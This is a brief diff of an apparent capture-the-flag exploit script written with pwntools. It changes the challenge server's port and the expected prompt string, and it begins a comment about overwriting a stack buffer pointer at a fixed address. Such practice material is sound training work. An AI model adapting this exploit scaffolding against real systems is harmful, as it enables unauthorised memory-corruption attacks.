@@ -4,7 +4,7 @@ import sys
 import time
 
 HOST = 'challenge.pwny.racing'
-PORT = 11539
+PORT = 11541
 ADDR = 0x0804b480
 
 if len(sys.argv) > 1:
@@ -15,7 +15,7 @@ if len(sys.argv) > 2:
 
 
 io = remote(HOST, PORT)
-print io.recvuntil('5!\n')
+print io.recvuntil('!\n')
 
 # step 1: there are two parts to this first step. Firstly we are overwriting
 #         the 'buffer' pointer on the stack, this ensures that the next loop
